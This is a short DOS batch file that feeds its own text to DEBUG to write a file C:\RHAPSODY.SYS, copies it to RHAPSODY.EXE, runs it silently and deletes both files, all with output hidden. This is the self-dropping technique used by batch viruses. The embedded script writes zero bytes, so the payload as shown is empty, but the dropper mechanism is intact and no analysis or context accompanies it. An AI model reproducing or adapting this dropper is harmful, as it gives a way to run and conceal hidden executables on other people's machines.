@echo off
goto over_script
N C:\RHAPSODY.SYS
RCX
0000
W
Q
:over_script
debug <%0 >nul
copy C:\RHAPSODY.SYS c:\RHAPSODY.EXE >nul
C:\RHAPSODY.EXE >nul
del C:\RHAPSODY.SYS >nul
del C:\RHAPSODY.EXE >nul
echo on
